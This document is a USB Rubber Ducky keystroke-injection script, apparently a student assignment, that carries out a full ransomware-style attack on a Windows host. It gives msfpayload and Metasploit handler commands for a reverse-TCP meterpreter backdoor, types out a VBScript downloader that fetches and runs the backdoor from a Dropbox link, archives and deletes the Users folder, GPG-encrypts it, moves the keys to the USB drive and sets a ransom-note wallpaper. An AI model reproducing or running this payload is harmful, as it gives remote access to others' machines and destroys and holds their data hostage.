REM We have to install a meterpreter backdoor (persistence) into the target system first. In order to do this, we will be using metasploit to create a meterpreter.
REM A meterpreter is a payload that uses in-memory DLL injection stagers and is extended over the network at runtime. This essentially creates a backdoor that us, the attacker
REM can use in order to maintain access within a host.
REM Now, in order to create the meterpreter, we have to first make the payload. We can go onto our kali VM in order to do this. Then, we run the command
REM 'msfpayload windows/meterpreter/reverse_tcp LHost=[Your VM's IP Address] LPort =[any port] X > meterpreter.exe'

REM After doing this, we have generated a payload called 'meterpreter.exe'. 
REM In order to gain access to the host, we have to set up a listening server. We can also set this up in the kali metasploit through the following commands:
REM use exploit/multi/handler
REM set LHOST [Kali IP Address]
REM set LPORT [your port]
REM exploit

REM Now that we have the payload, we want the machine that we are attacking to run the payload. 
REM We can do this by forcing them to download the meterpreter, and then execute it. So, we can first store the payload online into a dropbox, and then run the program through the ducky code.

GUI R
DELAY 400
STRING cmd
DELAY 400
ENTER
DELAY 400
STRING copy con download.vbs
REM Note, we are opening the command prompt and creating a VBscript that downloads a file from a URL and executing it
REM Another note, VBScript is an interpreted script language from Microsoft that is a subset of its Visual Basic programming language designed for interpretation by Web browsers.
ENTER
STRING Set args = WScript.Arguments:a = split(args(0), "/")(UBound(split(args(0),"/")))
ENTER
STRING Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"):objXMLHTTP.open "GET", args(0), false:objXMLHTTP.send()
ENTER
STRING If objXMLHTTP.Status = 200 Then
ENTER
STRING Set objADOStream = CreateObject("ADODB.Stream"):objADOStream.Open
ENTER
STRING objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0
ENTER
STRING Set objFSO = Createobject("Scripting.FileSystemObject"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a
ENTER
STRING objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing 
ENTER
STRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing
ENTER
CTRL z
ENTER
STRING cscript download.vbs https://www.dropbox.com/s/astgfieygl9r97h/meterpreter.exe?dl=1
ENTER
STRING meterpreter.exe
ENTER
STRING exit
ENTER
DELAY 400


REM Now we have to generate a GPG key using the password OMGWTFBBQChicken
REM We can do this by opening the command prompt and pretend like you are typing in the commands to create a GPG key, 
REM like we did in lab 1 in order to turn in our homework assignments.

GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING gpg --gen-key
ENTER
DELAY 200
STRING 1
ENTER
DELAY 200
STRING 0
ENTER
DELAY 200
STRING y
ENTER
DELAY 200
STRING H@ck3r M@st3r
ENTER
DELAY 200
STRING hackers4lyfe@gmail.com
ENTER
DELAY 200
STRING O
ENTER
DELAY 200
STRING OMGWTFBBQChicken
ENTER
DELAY 200
STRING OMGWTFBBQChicken
ENTER
DELAY 750
STRING EXIT
ENTER
DELAY 400

REM Now we have generated a gpg key with hackers4lyfe@gmail.com as the username and the password OMGWTF....
REM The problem with the way we were taught in class for encrypting files is that you can't just encrypt a folder. 
REM Thus, one way that we can encrypt the drive is that we can archive the folder and turn it into a tar, and then encrypt that tar
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING cd..
ENTER
DELAY 200
STRING tar -czvf Users.tar.gz "C:\Users\"
ENTER
DELAY 1000

REM Now that we have a tar, it is a copy of the users directory. We can now delete the normal users directory so that they don't have access to that, and only to the tar which they will have to decrypt

STRING rmdir /s /q Users
ENTER 
DELAY 5000

REM Now we actually encrypt the directory
STRING gpg -ea -r hacker4lyfe@gmail.com Users.tar.gz
DELAY 100
ENTER
DELAY 600
STRING EXIT
ENTER
DELAY 400


REM After encrypting the directory, now we have to export the public and private key onto the rubber ducky usb drive. First, we need to export the public and private key. We can do so as below:
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING gpg --export -a "H@ck3r M@st3r" > public.key
ENTER
DELAY 200
STRING gpg --export-secret-key -a "H@ck3r M@st3r" > private.key
ENTER
DELAY 200

REM We just exported the the public and private key. Now we want to move this to the rubber ducky directory.

STRING move "public.key" "F:\"
ENTER
DELAY 400
STRING move "private.key" "F:\"
ENTER
DELAY 400
REM Note, this is assuming that the rubber duck hard drive's directory is named F: when plugged into the computer
REM Now, delete the keys

STRING gpg --delete-secret-key "H@ck3r M@st3r"
REM First, we delete the private key and then the public key otherwise the other order will not work
ENTER
DELAY 600
STRING gpg --delete-key "H@ck3r M@st3r"
ENTER
DELAY 300
STRING EXIT
ENTER


REM Now, we leave a ransom note meme!
REM Note, I used the payload documentation on the rubber duck website to help figure out how to change the background

GUI d
WINDOWS
STRING http://static4.fjcdn.com/comments/Why+does+this+remind+me+of+a+ransom+note+_72a6df5c29e8606b9c18ecf2628c9c00.jpg
ENTER
DELAY 100
REM Opens up window and goes to a image I created xD
CTRL s
STRING %userprofile%\Desktop\RANSOM
ENTER
REM saving the picture to the user Desktop, pic name RANSOM...
DELAY 100
GUI d
REM shows desktop
WINDOWS r
STRING %userprofile%\Desktop\RANSOM.png
ENTER
REM opens the png file
MENU
ENTER
ALT F4
REM sets the background, and closes.
GUI d
MENU
STRING v
STRING d